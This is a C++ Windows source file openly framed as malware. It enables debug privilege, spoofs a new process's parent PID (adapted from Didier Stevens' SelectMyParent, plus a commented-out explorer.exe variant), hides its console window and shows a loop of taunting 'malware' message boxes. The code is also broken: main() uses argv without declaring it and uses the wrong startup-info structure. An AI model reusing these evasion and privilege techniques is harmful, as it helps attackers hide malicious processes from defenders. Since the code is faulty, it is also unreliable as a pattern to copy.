//C++ Headers

#include <winsock2.h>       //Socket Header -	includes scoket functions
#include <windows.h>        //Win API Header -	Windows API functions, use of T/WCHARS
#include <ws2tcpip.h>       //TCP-IP Header -	TCP-IP Defs
#include <winbase.h>

#include <tlhelp32.h>       //tOOLHELP FOR WINDOWS32

//C Header
#include <stdio.h>          //Input Output Header
#include <string.h>
#include <math.h>
#include <vector>
#include <string>

//Debug C++ Header
//#include <iostream>     //Input Output Debug Header
#include <psapi.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

#define HOST_ADDR "10.1.2.128"

BOOL CurrentProcessAdjustToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}

/*
void spoof()
{
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    HANDLE hExplorerexe = NULL;

    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);

    for (int i = 0; i < runningProcessesCount; i++)
    {
        if (runningProcessesIDs[i] != 0)
        {
            HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, runningProcessesIDs[i]);
            char processName[MAX_PATH + 1];
            GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
            _strlwr(processName);
            if (strstr(processName, "explorer.exe") && hProcess)
            {
                hExplorerexe = hProcess;
            }
        }
    }

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
    RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
}
*/


void spam(){

    int response = MessageBoxW(
        NULL, 
        L"Local malware in your area would like to reset your computer", 
        L"ALERT", 
        MB_ICONEXCLAMATION);

    while (response == IDOK)
        response = MessageBoxW(
            NULL, 
            L"ALREADY GOT YOU!", 
            L"HAHAHAHAHA", 
            MB_ICONERROR);
        if (response == IDOK){

        };
}



int main()
{

	STARTUPINFOA sie = {sizeof(sie)};
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = 0;

	//_putts(TEXT("SelectMyParent v0.0.0.1: start a program with a selected parent process"));
	//_putts(TEXT("Source code put in public domain by Didier Stevens, no Copyright"));
	//_putts(TEXT("https://DidierStevens.com"));
	//_putts(TEXT("Use at your own risk\n"));
	//if (argc != 3)
		//_putts(TEXT("usage: SelectMyParent program pid"));
	//else
	//{
		dwPid = _tstoi(argv[2]);
		if (0 == dwPid)
		{
			//_putts(TEXT("Invalid pid"));
			return 0;
		}
		InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
		pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
		if (NULL == pAttributeList)
		{
			//DisplayErrorMessage(TEXT("HeapAlloc error"), GetLastError());
			return 0;
		}
		if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
		{
			//DisplayErrorMessage(TEXT("InitializeProcThreadAttributeList error"), GetLastError());
			return 0;
		}

		CurrentProcessAdjustToken();
		hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

		if (NULL == hParentProcess)
		{
			//DisplayErrorMessage(TEXT("OpenProcess error"), GetLastError());
			return 0;
		}
		if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
		{
			//DisplayErrorMessage(TEXT("UpdateProcThreadAttribute error"), GetLastError());
			return 0;
		}
		sie.lpAttributeList = pAttributeList;
		if (!CreateProcess(NULL, argv[1], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
		{
			//DisplayErrorMessage(TEXT("CreateProcess error"), GetLastError());
			return 0;
		}
		_tprintf(TEXT("Process created: %d\n"), pi.dwProcessId);
		DeleteProcThreadAttributeList(pAttributeList);
		CloseHandle(hParentProcess);
	//}







    HWND stealth;       //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth = FindWindowA("ConsoleWindowClass", NULL);  //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth, SW_HIDE);                       //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    spam();
    return 0;
}
